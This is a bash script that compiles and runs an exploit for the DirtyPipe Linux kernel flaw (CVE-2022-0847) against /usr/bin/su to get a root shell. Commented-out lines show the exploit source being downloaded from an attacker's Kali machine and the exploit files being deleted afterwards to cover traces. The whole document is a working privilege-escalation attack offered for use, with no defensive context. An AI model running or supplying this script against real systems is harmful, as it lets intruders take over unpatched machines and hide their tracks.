#!/bin/bash
#
# DirtyPipe (CVE-2022-0847) Compilation and Exploitation

# Set Kali IP
# KALI_IP=192.168.1.4

# Grab a copy of the exploit code and store it in /tmp directory
# echo "[*] Grabbing a copy of the exploit code..."
# wget http://${KALI_IP}/CVE-2022-0847.c -O /tmp/CVE-2022-0847.c 2>/dev/null

# Compile exploit and set execute permission on the executable
echo "[*] Compiling exploit..."
cd /tmp && gcc CVE-2022-0847.c -o CVE-2022-0847
chmod +x CVE-2022-0847

# Execute the exploit to get a root shell
echo "[*] Executing the Dirty Pipe exploit..."
./CVE-2022-0847 /usr/bin/su
# echo "whoami && rm /tmp/sh /tmp/CVE-2022-0847.c /tmp/CVE-2022-0847" | ./CVE-2022-0847 /usr/bin/su
# echo "[+] All commands have been executed!"